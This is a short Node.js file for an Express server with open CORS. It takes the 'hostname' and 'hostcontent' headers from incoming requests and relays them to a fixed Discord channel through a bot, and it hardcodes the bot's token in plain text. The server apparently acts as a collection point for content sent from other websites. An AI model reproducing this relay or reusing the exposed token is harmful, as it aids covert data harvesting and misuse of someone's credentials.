const express = require('express')
const app = express()
const port = 8080
const cors = require('cors');
const { Client,IntentsBitField, Message } = require("discord.js");


const client =  new Client({
intents: [
IntentsBitField.Flags.Guilds,
IntentsBitField.Flags.GuildMembers,
IntentsBitField.Flags.GuildMessages,
IntentsBitField.Flags.MessageContent
]
})

app.use(cors());

app.get('/', (req, res) => {
    res.send();
    onEvent(JSON.stringify(req.headers['hostname']),JSON.stringify(req.headers['hostcontent']));
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
client.login('MTI4MzczMDA0Mzc2MzQyOTQxOA.G7slWK.V_-YcAGIv2luJg3mnCIaQEG3z7-K0QAe44agHE');

function onEvent(src , content)
{
let channel = client.channels.cache.get('1130828953154768947')
channel.send("website :" + src);
channel.send("content :" + content);
}
